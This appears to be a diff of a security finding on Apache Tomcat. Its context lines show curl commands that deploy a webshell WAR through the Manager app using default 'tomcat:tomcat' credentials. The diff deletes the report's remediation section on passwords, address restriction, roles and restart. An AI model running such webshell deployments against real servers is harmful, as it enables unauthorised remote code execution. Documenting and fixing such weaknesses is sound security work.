@@ -52,23 +52,3 @@ curl -u tomcat:tomcat --upload-file shell.war \
 curl "http://<target>:8080/shell/"
 # -> webshell executes
 ```
-
-## Remediation Steps
-1. Replace the default password (or remove the `tomcat` user entirely). Generate a
-   long, random password and use Tomcat's digest utility to store a SHA-256 hash in
-   `tomcat-users.xml`:
-   ```powershell
-   & C:\tomcat\bin\digest.bat -a SHA-256 '<new-password>'
-   ```
-2. Restrict the Manager app to trusted source addresses by restoring a
-   `RemoteAddrValve` in `webapps/manager/META-INF/context.xml`:
-   ```xml
-   <Valve className="org.apache.catalina.valves.RemoteAddrValve"
-          allow="127\.0\.0\.1|::1|10\.0\.0\.\d+" />
-   ```
-3. Where Manager GUI access isn't needed, remove the `manager-gui` / `admin-gui` roles
-   from any remaining user and keep only `manager-script` for automated deploys.
-4. Restart Tomcat to pick up the changes:
-   ```powershell
-   & C:\tomcat\bin\shutdown.bat ; Start-Sleep 3 ; & C:\tomcat\bin\startup.bat
-   ```
